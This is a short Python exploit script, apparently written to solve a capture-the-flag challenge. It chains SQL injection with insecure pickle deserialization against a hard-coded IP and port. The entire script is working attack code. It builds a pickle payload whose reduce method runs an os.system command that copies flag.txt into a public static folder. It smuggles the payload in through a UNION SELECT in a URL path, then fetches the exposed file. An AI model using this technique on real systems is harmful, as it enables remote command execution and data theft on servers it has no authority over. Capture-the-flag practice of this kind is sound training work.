#!/usr/bin/python3
import sys
import base64
import pickle
import os
import requests
import time

 
payload = "cat flag.txt > application/static/flag.txt"

# Exploit class 
class Exploit:

    # __reduce__ method for serialization and deserialization
    def __reduce__(self):
        return os.system, (payload,)

def exploit(url):
    # Create an instance of the Exploit class
    exploit_instance = Exploit()

    # Serialize the object using pickle and encode in base64
    serialized_payload = base64.b64encode(pickle.dumps(exploit_instance)).decode()

    # Construct the final URL by appending the serialized payload
    final_url = f"{url}/view/' UNION SELECT '{serialized_payload}"

    # Perform a GET request. Exploiting the SQLi.
    response = requests.get(final_url)

def results(url):
    exploit_results = f"{url}/static/flag.txt"
    response = requests.get(exploit_results)
    print(response.text)

if __name__ == "__main__":
    target_url = "http://94.237.62.195:55155"  # Replace with the target URL

    print("[*] Executing program: Pickle Rick..")
    exploit(target_url)
    time.sleep(2)
    print("[*] Pickle Rick is returning...")
    results(target_url)
